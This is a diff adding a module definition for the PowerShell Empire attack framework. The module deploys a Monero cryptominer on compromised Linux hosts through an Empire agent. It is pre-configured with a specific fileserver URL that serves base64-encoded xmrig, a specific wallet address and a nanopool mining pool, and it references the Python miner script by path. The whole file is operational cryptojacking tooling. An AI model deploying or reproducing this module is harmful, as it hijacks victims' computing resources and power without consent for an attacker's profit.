@@ -1,0 +1,37 @@
+name: Cryptominer
+authors:
+  - '@BuildAndDestroy'
+description: Deploys a monero miner
+software: ''
+techniques:
+  - T1496
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '3.6'
+comments:
+  - https://attack.mitre.org/techniques/T1496/, https://github.com/BuildAndDestroy/powershell-empire-custom
+options:
+  - name: Agent
+    description: Agent to execute module on
+    required: true
+    value: ''
+  - name: Fileserver
+    description: Full URL and directory path for the fileserver we will download xmrig in base64
+    required: true
+    value: 'https://fileshare.outssystems.com/c3VnYXJkYWRkeQo/decodeme/'
+  - name: Wallet
+    description: Your monero wallet address
+    required: true
+    value: '443iMnW1EnzKkoqQwJH3sUcEMbgKMcvnd5EG8uuECWNriNfgQwmdXCsBseht9cGyoj19ZSqhkvW3DW5kGFFWmmrN989jGJf'
+  - name: FileNumber
+    description: Last file number to download
+    required: true
+    value: 10
+  - name: MiningPool
+    description: mining pool to connect our miner
+    required: true
+    value: 'xmr-us-west1.nanopool.org:14433'
+script_path: '/usr/share/powershell-empire/empire/server/data/module_source/python/impact/linux/xmr_miner.py'
